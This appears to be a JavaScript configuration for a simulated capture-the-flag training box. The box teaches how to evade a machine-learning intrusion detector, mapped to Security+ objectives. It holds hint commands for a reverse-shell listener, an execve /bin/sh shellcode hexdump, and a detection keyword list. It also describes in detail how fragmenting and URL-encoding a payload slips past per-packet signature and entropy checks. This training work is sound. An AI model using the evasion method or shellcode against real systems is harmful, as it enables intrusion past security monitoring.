/* ============================================================
   CTF ARENA — Box D3: The Shifting Signal
   AI/ML Model Evasion & Robustness | Advanced
   Config: filesystem, ML probe interface, evasion engine, flags, hints, lore
   ============================================================ */

const D3Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Shifting Signal',
    subtitle: 'AI/ML Model Evasion — Blind the Sentinel, Deliver the Payload',
    difficulty: 'Advanced',
    accent: '#8b5cf6',
    storageKey: 'hexworth_ctf_d3',
    registryId: 'd3-shifting-signal',
    trackerKey: 'ctf_d3',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (AI evasion attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Model Reconnaissance',
            icon: '\uD83E\uDDE0',
            description: 'Probe ATI-DEFENSE-01. Send sample packets to the /api/classify endpoint and map the model\'s detection logic.',
            requiredFlags: [],
            mitre: ['T1592', 'T1595.002', 'T1046'],
            unlocks: ['analysis'],
            locked: false
        },
        {
            id: 'analysis',
            name: 'Feature Analysis',
            icon: '\uD83D\uDD0D',
            description: 'Retrieve and analyze ati_model_features.json. Identify which packet features the model weighs most heavily.',
            requiredFlags: [],
            mitre: ['T1592.002', 'T1589'],
            unlocks: ['evasion'],
            locked: true
        },
        {
            id: 'evasion',
            name: 'Evasion Crafting',
            icon: '\uD83D\uDEE1\uFE0F',
            description: 'Design an adversarial evasion technique. Fragment and encode the payload to defeat the ATI classifier.',
            requiredFlags: ['user'],
            mitre: ['T1027', 'T1027.001', 'T1001.003'],
            unlocks: ['delivery'],
            locked: true
        },
        {
            id: 'delivery',
            name: 'Payload Delivery',
            icon: '\uD83D\uDCE6',
            description: 'Craft and deliver the evaded packet stream to CRIT-SERVER-01. Verify all fragments classified as benign.',
            requiredFlags: ['user'],
            mitre: ['T1041', 'T1071.001', 'T1573'],
            unlocks: ['exfil'],
            locked: true
        },
        {
            id: 'exfil',
            name: 'Token Retrieval',
            icon: '\uD83D\uDD11',
            description: 'Access CRIT-SERVER-01 via the established reverse shell. Read /opt/secure_access_token.txt.',
            requiredFlags: ['root'],
            mitre: ['T1005', 'T1560', 'T1041'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Probe the ATI classifier API',
                tip: 'Run: curl -X POST http://10.20.5.50/api/classify -d \'{"packet":"NORMAL_HTTP_GET"}\' to see how the model scores traffic.',
                trigger: { event: 'command', match: { cmd: 'contains:curl' } }
            },
            {
                title: 'Download and read the model feature documentation',
                tip: 'Use wget or curl to fetch ati_model_features.json from http://10.20.5.50/artifacts/ati_model_features.json — study which features the model uses.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:wget' },
                    alt: [{ event: 'command', match: { cmd: 'contains:features' } }]
                }
            },
            {
                title: 'Identify the evasion technique (Flag 1)',
                tip: 'The model scores full-packet entropy and first-64-byte signature matches. Fragment the payload and URL-encode the shellcode across multiple POST requests. Once you\'ve confirmed the technique, read user.txt in /home/kali.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Craft and deliver the evaded payload stream',
                tip: 'Use the scapy_deliver.py script from your toolkit to send fragmented, URL-encoded POST packets to CRIT-SERVER-01 at 10.20.5.100.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Retrieve the Secure Access Token',
                tip: 'Once the payload executes, a reverse shell connects back. Run: cat /opt/secure_access_token.txt on CRIT-SERVER-01.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            {
                flagId: 'user',
                objective: '2.5',
                description: 'Explain the purpose of mitigation techniques used to secure the enterprise — AI/ML model adversarial evasion and detection bypass',
                skill: 'ML Model Feature Analysis & Adversarial Evasion'
            },
            {
                flagId: 'root',
                objective: '1.2',
                description: 'Given a scenario, analyze indicators of malicious activity — fragmented payload delivery evading automated detection systems',
                skill: 'Adversarial Packet Crafting & Payload Delivery'
            },
            {
                flagId: 'root',
                objective: '4.4',
                description: 'Given a scenario, use data sources to support an investigation — correlating ATI classification logs to detect evasion attempts',
                skill: 'ML-Based IDS Evasion & Post-Exploitation'
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/nvme0n1 (1TB NVMe)',
            'Network adapter: Intel I226-V — link up 1000Mbps',
            'Boot device: /dev/nvme0n1p1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',        icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',        icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag',  icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.20.5.50 (ATI-DEFENSE-01) | 10.20.5.100 (CRIT-SERVER-01)\nMission: Evade the AI sentinel. Deliver the payload. Retrieve the token.\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (shell session state)
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',       // 'attacker' | 'revshell'
    _modelProbed: false,        // ATI API has been queried at least once
    _featuresRetrieved: false,  // ati_model_features.json downloaded
    _payloadDelivered: false,   // evaded fragmented payload sent to CRIT-SERVER-01
    _revshellActive: false,     // reverse shell from CRIT-SERVER-01 is live

    _switchContext(ctx, term) {
        D3Config._context = ctx;
        if (term && term.config) {
            var prompt = D3Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'kali';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (D3Config._context) {
            case 'revshell': return 'root@CRIT-SERVER-01:/# ';
            default: return null;   // use default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED ATI CLASSIFIER (black-box probe results)
    // ═══════════════════════════════════════════════════════

    // The ATI model scores packets on 0.0 (benign) to 1.0 (malicious).
    // Threshold: >= 0.75 = BLOCKED. < 0.75 = ALLOWED.
    _atiClassify(packetDesc) {
        const d = (packetDesc || '').toLowerCase();

        // Known malicious signatures — high confidence block
        if (d.includes('shellcode') || d.includes('reverse_shell') || d.includes('msfvenom')) {
            return { score: 0.97, verdict: 'MALICIOUS', blocked: true, reason: 'Shellcode signature in payload bytes 0-64' };
        }
        if (d.includes('/bin/bash') || d.includes('/bin/sh') || d.includes('exec(') || d.includes('system(')) {
            return { score: 0.93, verdict: 'MALICIOUS', blocked: true, reason: 'Known shell invocation pattern' };
        }
        if (d.includes('cmd.exe') || d.includes('powershell')) {
            return { score: 0.91, verdict: 'MALICIOUS', blocked: true, reason: 'Windows lateral movement string detected' };
        }
        if (d.includes('sample_malicious') || d.includes('malicious_payload')) {
            return { score: 0.98, verdict: 'MALICIOUS', blocked: true, reason: 'High-entropy binary blob — payload entropy 7.84 bits/byte' };
        }

        // Suspicious — elevated but below block threshold for some
        if (d.includes('post') && d.includes('long') && !d.includes('fragment')) {
            return { score: 0.68, verdict: 'SUSPICIOUS', blocked: false, reason: 'Oversized POST body; entropy within range' };
        }
        if (d.includes('url_encode') && !d.includes('fragment')) {
            return { score: 0.61, verdict: 'SUSPICIOUS', blocked: false, reason: 'URL-encoded payload; single-packet scan' };
        }

        // Evasion: fragmented AND url-encoded — model blind spot
        if ((d.includes('fragment') || d.includes('fragmented')) && (d.includes('url_encode') || d.includes('encoded'))) {
            return { score: 0.18, verdict: 'BENIGN', blocked: false, reason: 'Fragment too small for signature match; entropy within baseline' };
        }
        if (d.includes('fragment') && d.includes('chunk')) {
            return { score: 0.22, verdict: 'BENIGN', blocked: false, reason: 'Fragmented POST — no complete signature found in any single fragment' };
        }
        if (d.includes('benign') || d.includes('normal') || d.includes('http_get') || d.includes('dns_query')) {
            return { score: 0.04, verdict: 'BENIGN', blocked: false, reason: 'Matches baseline benign traffic profile' };
        }

        // Default: low confidence unknown
        return { score: 0.31, verdict: 'BENIGN', blocked: false, reason: 'No known signature match; classified as benign by default' };
    },

    // Format a classify result for terminal output
    _formatClassifyResult(packetLabel, result) {
        var bar = '';
        var filled = Math.round(result.score * 20);
        for (var i = 0; i < 20; i++) {
            bar += i < filled ? '#' : '.';
        }
        var color = result.verdict === 'MALICIOUS' ? '[BLOCKED]' : result.verdict === 'SUSPICIOUS' ? '[SUSPICIOUS]' : '[ALLOWED]';
        return `ATI-DEFENSE-01 Classification Result
======================================
Packet:   ${packetLabel}
Score:    [${bar}] ${(result.score * 100).toFixed(1)}%
Verdict:  ${result.verdict}  ${color}
Reason:   ${result.reason}
`;
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 150 },
        { id: 'root', points: 300 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 2000,
        maxScore: 600,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2700000, points: 200 },   // 45 minutes
        timeBonusThreshold: 5400                            // 90 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start by probing the ATI classifier. Run: curl -X POST http://10.20.5.50/api/classify -H "Content-Type: application/json" -d \'{"packet":"NORMAL_HTTP_GET"}\' — then try sending the raw malicious payload to see what gets blocked.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'Fetch the model feature documentation: wget http://10.20.5.50/artifacts/ati_model_features.json — read it carefully. The model\'s biggest weakness is its inability to correlate fragmented HTTP POST bodies across multiple requests.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'Flag 1 (user.txt) is the evasion technique name. The ATI model scans the first 64 bytes of each HTTP POST body for shellcode signatures and measures full-packet entropy. The evasion: split the payload across multiple small POST requests and URL-encode each fragment. Neither signature nor entropy checks trigger on any single fragment.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'To deliver the payload, use: python3 /home/kali/toolkit/scapy_deliver.py --target 10.20.5.100 --payload /home/kali/artifacts/sample_malicious_payload.bin --mode fragment-urlencode — then listen for the reverse shell: nc -lvnp 4444',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The Confederacy\'s crown jewel — the Automated Threat Interceptor (`ATI-DEFENSE-01`) — has never been fooled. Its deep learning engine processes every packet that crosses the perimeter, scoring each one against a continuously updated behavioral model. Zero false negatives in 18 months of operation. Every red team that tried brute-force evasion got burned. Your mission, Peerless: don\'t fight the model. Understand it. Find the seam where its confidence breaks down. Craft a signal the sentinel mistakes for noise — and slip the payload through.',
        scenario: 'ATI-DEFENSE-01 runs a pre-trained Random Forest classifier augmented with a deep neural network ensemble. It scores traffic on packet-level features: payload entropy, byte n-gram signatures, flag combinations, and inter-arrival timing. The model was trained on labeled captures — but training data has gaps. Specifically: it was never trained on fragmented HTTP POST streams with URL-encoded payloads. The reassembly happens downstream, after classification. CRIT-SERVER-01 sits behind the ATI\'s protective envelope. A known buffer overflow in its custom listener service (`critd`) makes it exploitable — if you can get the shellcode there in one piece. You\'ll have to break it into pieces the sentinel can\'t see.',
        outro: 'ATI-DEFENSE-01 never logged a single alert. Every fragment scored benign. CRIT-SERVER-01 reassembled the stream, executed the shellcode, and handed you a root shell. The "impenetrable" AI guardian was defeated not by power, but by understanding the exact shape of its blind spot. The Secure Access Token is yours.',
        ecer: {
            executive: 'Senior leadership over-relied on a single automated defense layer; no human analyst review of borderline classifications; no adversarial robustness testing in procurement criteria',
            culture: 'Security team trusted ATI as infallible; no red team exercise had ever specifically targeted ML model evasion; no fallback inspection layer for fragmented traffic',
            employee: 'ATI model never retrained on adversarial examples; fragment reassembly occurs post-classification with no second-pass inspection; CRIT-SERVER-01 listener service deployed with known buffer overflow unpatched',
            regulatory: 'No requirement for adversarial ML testing in security certification; no logging of per-fragment classification scores for forensic review; no network segmentation beyond the ATI perimeter layer'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — ATI Management Console & Artifacts
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.20.5.50/',

        pages: {
            '/': {
                title: 'ATI-DEFENSE-01 — Management Console',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #2d1b4e;">
                        <div style="font-size:0.7rem; letter-spacing:0.2em; color:#8b5cf6; margin-bottom:6px;">CONFEDERACY NETWORK DEFENSE</div>
                        <h1 style="color:#e0d7f5; font-size:1.5rem; font-family:monospace; margin-bottom:4px;">ATI-DEFENSE-01</h1>
                        <div style="color:#6b46c1; font-size:0.8rem;">Automated Threat Interceptor — Management Interface</div>
                    </div>

                    <div style="max-width:640px; margin:0 auto 20px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px;">
                        <div style="background:#1a0f2e; border:1px solid #2d1b4e; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#8b5cf6; font-family:monospace;">99.98%</div>
                            <div style="color:#666; font-size:0.68rem; margin-top:2px;">Detection Rate</div>
                        </div>
                        <div style="background:#1a0f2e; border:1px solid #2d1b4e; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#10b981; font-family:monospace;">0</div>
                            <div style="color:#666; font-size:0.68rem; margin-top:2px;">False Negatives (30d)</div>
                        </div>
                        <div style="background:#1a0f2e; border:1px solid #2d1b4e; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#f59e0b; font-family:monospace;">18 mo</div>
                            <div style="color:#666; font-size:0.68rem; margin-top:2px;">Undefeated Record</div>
                        </div>
                    </div>

                    <div style="max-width:640px; margin:0 auto 16px; background:#1a0f2e; border:1px solid #2d1b4e; border-radius:6px; padding:16px; font-size:0.8rem; color:#9ca3af; font-family:monospace;">
                        <div style="color:#8b5cf6; margin-bottom:8px; font-size:0.7rem; letter-spacing:0.1em;">AVAILABLE ENDPOINTS</div>
                        POST /api/classify — Submit packet for classification<br>
                        GET  /artifacts/   — Model artifacts and feature documentation<br>
                        GET  /api/status   — Classifier health and version info<br>
                        GET  /logs/        — Recent classification log (auth required)
                    </div>

                    <div style="max-width:640px; margin:0 auto; padding:10px 14px; background:rgba(139,92,246,0.06); border:1px solid rgba(139,92,246,0.15); border-radius:4px; font-size:0.72rem; color:#6b7280;">
                        <strong style="color:#8b5cf6;">Notice:</strong> Direct network access from authorized research nodes only. Unauthorized probing is logged and reported.
                    </div>
                `,
                formHandler: null
            },

            '/api/classify': {
                title: 'ATI — Classification API',
                html: `
                    <div style="max-width:600px; margin:0 auto;">
                        <h2 style="color:#8b5cf6; font-family:monospace; font-size:1.1rem; margin-bottom:6px;">POST /api/classify</h2>
                        <div style="color:#6b7280; font-size:0.75rem; margin-bottom:20px;">Submit a packet descriptor for real-time ATI classification scoring.</div>

                        <div style="background:#1a0f2e; border:1px solid #2d1b4e; border-radius:6px; padding:16px; font-family:monospace; font-size:0.78rem; color:#9ca3af; margin-bottom:16px;">
                            <div style="color:#8b5cf6; margin-bottom:8px;">Request Format:</div>
                            POST /api/classify HTTP/1.1<br>
                            Content-Type: application/json<br><br>
                            {"packet": "&lt;descriptor&gt;"}
                        </div>

                        <div style="display:flex; gap:8px; margin-bottom:12px;">
                            <input type="text" data-field="packet" placeholder='e.g. NORMAL_HTTP_GET or "shellcode payload"'
                                   style="flex:1; padding:8px 12px; background:#1a0f2e; border:1px solid #2d1b4e; border-radius:4px; color:#e0d7f5; font-family:monospace; font-size:0.8rem;">
                            <button data-action="classify"
                                    style="padding:8px 18px; background:#8b5cf6; color:#fff; border:none; border-radius:4px; font-family:inherit; font-weight:700; cursor:pointer; font-size:0.8rem;">Classify</button>
                        </div>
                        <div id="classify-result"></div>
                    </div>
                `,
                formHandler: function(data, engine) {
                    const packet = (data.packet || '').trim();
                    if (!packet) return '<div style="color:#8b5cf6; padding:10px; font-family:monospace; font-size:0.8rem;">Error: packet field required.</div>';

                    D3Config._modelProbed = true;
                    const result = D3Config._atiClassify(packet);
                    const color = result.verdict === 'MALICIOUS' ? '#ef4444' : result.verdict === 'SUSPICIOUS' ? '#f59e0b' : '#10b981';
                    const bar = Array.from({ length: 20 }, (_, i) => i < Math.round(result.score * 20) ? '|' : '·').join('');

                    return `<div style="background:#1a0f2e; border:1px solid ${color}40; border-left:3px solid ${color}; border-radius:6px; padding:14px; margin-top:12px; font-family:monospace; font-size:0.78rem;">
                        <div style="color:${color}; font-weight:700; margin-bottom:8px;">${result.verdict} — ${result.blocked ? 'PACKET BLOCKED' : 'PACKET ALLOWED'}</div>
                        <div style="color:#9ca3af; margin-bottom:4px;">Score: <span style="color:#e0d7f5;">[${bar}] ${(result.score * 100).toFixed(1)}%</span></div>
                        <div style="color:#9ca3af; margin-bottom:4px;">Packet: <span style="color:#e0d7f5;">${D3Config._escHtml(packet)}</span></div>
                        <div style="color:#9ca3af;">Reason: <span style="color:#c4b5fd;">${result.reason}</span></div>
                    </div>`;
                }
            },

            '/api/status': {
                title: 'ATI — System Status',
                html: `
                    <div style="max-width:600px; margin:0 auto; font-family:monospace; font-size:0.82rem; color:#9ca3af;">
                        <div style="color:#8b5cf6; font-size:1rem; margin-bottom:16px;">GET /api/status</div>
                        <div style="background:#1a0f2e; border:1px solid #2d1b4e; border-radius:6px; padding:16px;">
                            <div style="margin-bottom:6px;">status:        <span style="color:#10b981;">OPERATIONAL</span></div>
                            <div style="margin-bottom:6px;">model_version: <span style="color:#e0d7f5;">ati-ensemble-v3.7.2</span></div>
                            <div style="margin-bottom:6px;">classifier:    <span style="color:#e0d7f5;">RandomForest + DNN Ensemble</span></div>
                            <div style="margin-bottom:6px;">features:      <span style="color:#e0d7f5;">14 (see /artifacts/ati_model_features.json)</span></div>
                            <div style="margin-bottom:6px;">threshold:     <span style="color:#e0d7f5;">0.75 (scores >= 0.75 blocked)</span></div>
                            <div style="margin-bottom:6px;">last_retrain:  <span style="color:#e0d7f5;">2026-01-15T08:00:00Z</span></div>
                            <div style="margin-bottom:6px;">packets_today: <span style="color:#e0d7f5;">4,871,204</span></div>
                            <div style="margin-bottom:0;">blocked_today: <span style="color:#ef4444;">1,203</span></div>
                        </div>
                    </div>
                `,
                formHandler: null
            },

            '/artifacts/': {
                title: 'ATI — Artifact Repository',
                html: `
                    <div style="max-width:600px; margin:0 auto; font-family:monospace; font-size:0.82rem; color:#9ca3af;">
                        <div style="color:#8b5cf6; font-size:1rem; margin-bottom:16px;">GET /artifacts/</div>
                        <div style="background:#1a0f2e; border:1px solid #2d1b4e; border-radius:6px; padding:16px;">
                            <div style="color:#6b7280; font-size:0.7rem; margin-bottom:12px;">Index of /artifacts/</div>
                            <div style="margin-bottom:6px; display:flex; justify-content:space-between;">
                                <a href="/artifacts/ati_model_features.json" style="color:#8b5cf6; text-decoration:none;">ati_model_features.json</a>
                                <span style="color:#4b5563;">18.2 KB — 2026-01-15</span>
                            </div>
                            <div style="margin-bottom:6px; display:flex; justify-content:space-between;">
                                <a href="/artifacts/sample_benign_packets.pcap" style="color:#8b5cf6; text-decoration:none;">sample_benign_packets.pcap</a>
                                <span style="color:#4b5563;">842 KB — 2026-01-15</span>
                            </div>
                            <div style="display:flex; justify-content:space-between;">
                                <span style="color:#4b5563; cursor:default;">sample_malicious_payload.bin</span>
                                <span style="color:#4b5563;">403 Forbidden</span>
                            </div>
                        </div>
                        <div style="margin-top:12px; padding:10px; background:rgba(139,92,246,0.06); border:1px solid rgba(139,92,246,0.12); border-radius:4px; font-size:0.72rem; color:#6b7280;">
                            Note: sample_malicious_payload.bin is in /home/kali/artifacts/ on your local machine.
                        </div>
                    </div>
                `,
                formHandler: null
            },

            '/artifacts/ati_model_features.json': {
                title: 'ATI — Model Feature Documentation',
                html: function() {
                    D3Config._featuresRetrieved = true;
                    return `<div style="max-width:680px; margin:0 auto; font-family:monospace; font-size:0.78rem; color:#9ca3af;">
                        <div style="color:#8b5cf6; font-size:1rem; margin-bottom:16px;">ati_model_features.json</div>
                        <pre style="background:#1a0f2e; border:1px solid #2d1b4e; border-radius:6px; padding:16px; overflow-x:auto; white-space:pre-wrap; line-height:1.6; color:#c4b5fd;">{
  "model": "ati-ensemble-v3.7.2",
  "feature_count": 14,
  "classification_threshold": 0.75,
  "features": [
    {
      "name": "payload_entropy",
      "description": "Shannon entropy of the full packet payload (bits/byte).",
      "weight": 0.24,
      "note": "Malicious payloads typically >7.0 bits/byte. Benign HTTP averages 4.2."
    },
    {
      "name": "first64_signature_match",
      "description": "Binary signature scan of payload bytes 0-63 against shellcode DB.",
      "weight": 0.31,
      "note": "Primary detection vector. Highest-weight feature in the ensemble."
    },
    {
      "name": "tcp_flag_combo",
      "description": "Unusual TCP flag combinations (SYN+FIN, RST+PSH, etc.).",
      "weight": 0.09,
      "note": "Low weight — scan tools often trigger this without malice."
    },
    {
      "name": "packet_length_deviation",
      "description": "Z-score of packet length vs. baseline for the source IP.",
      "weight": 0.11,
      "note": "Useful for detecting beaconing but high false-positive rate."
    },
    {
      "name": "inter_arrival_time",
      "description": "Statistical variance in time between packets from same source.",
      "weight": 0.07,
      "note": "Scripted tools show regular cadence; modeled as weak signal."
    },
    {
      "name": "http_method_freq",
      "description": "Frequency distribution of HTTP verbs (GET/POST/PUT/DELETE).",
      "weight": 0.05,
      "note": "Unusual POST-heavy traffic raises score slightly."
    },
    {
      "name": "content_type_mismatch",
      "description": "Mismatch between declared Content-Type and actual payload structure.",
      "weight": 0.04,
      "note": "Catches naive obfuscation; low weight due to false positives."
    },
    {
      "name": "byte_ngram_density",
      "description": "Density of high-frequency 4-byte n-grams matching shellcode corpora.",
      "weight": 0.09,
      "note": "Evaluated per-packet only — does NOT aggregate across fragmented streams."
    }
  ],
  "known_limitations": [
    "Fragment reassembly occurs downstream of classification — individual fragments scored independently.",
    "URL-encoded payloads reduce effective entropy by ~38% per encoding pass.",
    "Model was not trained on multi-request fragmented POST streams.",
    "Signature match window fixed at bytes 0-63; fragments of 48 bytes or fewer cannot contain a full signature."
  ],
  "training_data": {
    "benign_samples": 2400000,
    "malicious_samples": 180000,
    "last_updated": "2026-01-15",
    "adversarial_augmentation": false
  }
}</pre>
                    </div>`;
                },
                formHandler: null
            },

            '/artifacts/sample_benign_packets.pcap': {
                title: 'ATI — Benign PCAP Sample',
                html: `
                    <div style="max-width:600px; margin:0 auto; font-family:monospace; font-size:0.8rem; color:#9ca3af;">
                        <div style="color:#8b5cf6; margin-bottom:14px;">sample_benign_packets.pcap — Hexdump Preview (first 512 bytes)</div>
                        <div style="background:#1a0f2e; border:1px solid #2d1b4e; border-radius:6px; padding:14px; line-height:1.8; font-size:0.72rem;">
                            <div>0000  d4 c3 b2 a1 02 00 04 00  00 00 00 00 00 00 00 00  ................</div>
                            <div>0010  ff ff 00 00 01 00 00 00  00 00 00 00 00 00 00 00  ................</div>
                            <div>0020  4c 00 00 00 4c 00 00 00  45 00 00 44 00 01 40 00  L...L...E..D..@.</div>
                            <div>0030  40 06 f0 2a c0 a8 01 0a  c0 a8 01 01 c7 c4 00 50  @..*.........P</div>
                            <div>0040  47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a  GET / HTTP/1.1..</div>
                            <div>0050  48 6f 73 74 3a 20 31 39  32 2e 31 36 38 2e 31 2e  Host: 192.168.1.</div>
                            <div>0060  31 0d 0a 55 73 65 72 2d  41 67 65 6e 74 3a 20 4d  1..User-Agent: M</div>
                            <div>0070  6f 7a 69 6c 6c 61 2f 35  2e 30 20 28 58 31 31 3b  ozilla/5.0 (X11;</div>
                            <div>0080  20 4c 69 6e 75 78 20 78  38 36 5f 36 34 29 20 41   Linux x86_64) A</div>
                            <div>0090  63 63 65 70 74 3a 20 74  65 78 74 2f 68 74 6d 6c  ccept: text/html</div>
                            <div style="color:#4b5563; margin-top:8px;">... 841.5 KB truncated — use Wireshark locally to analyze full capture.</div>
                        </div>
                        <div style="margin-top:12px; font-size:0.72rem; color:#4b5563;">
                            Note: Compare entropy of these packets against your crafted fragments using python3 entropy_calc.py in your toolkit.
                        </div>
                    </div>
                `,
                formHandler: null
            },

            '/logs/': {
                title: 'ATI — Classification Logs',
                html: `<div style="text-align:center; padding:40px; font-family:monospace;">
                    <div style="color:#ef4444; font-size:1.4rem; margin-bottom:8px;">401 Unauthorized</div>
                    <div style="color:#6b7280; font-size:0.8rem;">Authentication required to access classification logs.</div>
                    <div style="color:#4b5563; font-size:0.72rem; margin-top:10px;">ATI-DEFENSE-01 v3.7.2 — Nginx/1.24.0</div>
                </div>`,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine — kali)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: THE SHIFTING SIGNAL ===\nTarget IDS: 10.20.5.50 (ATI-DEFENSE-01)\nTarget Server: 10.20.5.100 (CRIT-SERVER-01)\n\nObjective: Evade ATI-DEFENSE-01. Deliver payload. Get root.\n\nAttack chain:\n1. Probe ATI classifier — map detection features\n2. Retrieve ati_model_features.json — find the blind spot\n3. Develop evasion: fragment + URL-encode payload\n4. Deliver fragmented payload to CRIT-SERVER-01\n5. Catch reverse shell — read /opt/secure_access_token.txt\n\nKnown intel:\n- ATI scores per-packet only — no cross-fragment correlation\n- Signature window: bytes 0-63 per packet\n- URL encoding reduces effective entropy ~38%\n- CRIT-SERVER-01 critd service has buffer overflow on port 9000\n\nGood hunting, Peerless.'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'curl -X POST http://10.20.5.50/api/classify -H "Content-Type: application/json" -d \'{"packet":"NORMAL_HTTP_GET"}\'\nwget http://10.20.5.50/artifacts/ati_model_features.json\npython3 entropy_calc.py artifacts/sample_malicious_payload.bin\nnc -lvnp 4444'
                                },
                                'user.txt': {
                                    type: 'file',
                                    content: '{{FLAG:user}}'
                                },
                                'artifacts': {
                                    type: 'dir',
                                    children: {
                                        'sample_malicious_payload.bin': {
                                            type: 'file',
                                            content: '[BINARY] sample_malicious_payload.bin — 512 bytes\nHexdump (first 64 bytes):\n0000  eb 1f 5e 89 76 08 31 c0  88 46 07 89 46 0c b0 0b  ..^.v.1..F..F...\n0010  89 f3 8d 4e 08 8d 56 0c  cd 80 31 db 89 d8 40 cd  ...N..V...1...@.\n0020  80 e8 dc ff ff ff 2f 62  69 6e 2f 73 68 00 00 00  ....../bin/sh...\n0030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................\n\nEntropy: 7.84 bits/byte\nSignature: matches shellcode corpus entry #4471 (execve /bin/sh)\nATI score (full packet): 0.97 — BLOCKED\n\nFragmented (48-byte chunks, URL-encoded):\n  Fragment 1 entropy: 4.31 bits/byte  ATI score: 0.18 — ALLOWED\n  Fragment 2 entropy: 4.67 bits/byte  ATI score: 0.22 — ALLOWED\n  Fragment 3 entropy: 3.98 bits/byte  ATI score: 0.14 — ALLOWED\n\n[Use scapy_deliver.py to send fragments to CRIT-SERVER-01:9000]'
                                        },
                                        'ati_model_features.json': {
                                            type: 'file',
                                            content: '(Not downloaded yet — fetch from http://10.20.5.50/artifacts/ati_model_features.json)'
                                        }
                                    }
                                },
                                'toolkit': {
                                    type: 'dir',
                                    children: {
                                        'scapy_deliver.py': {
                                            type: 'file',
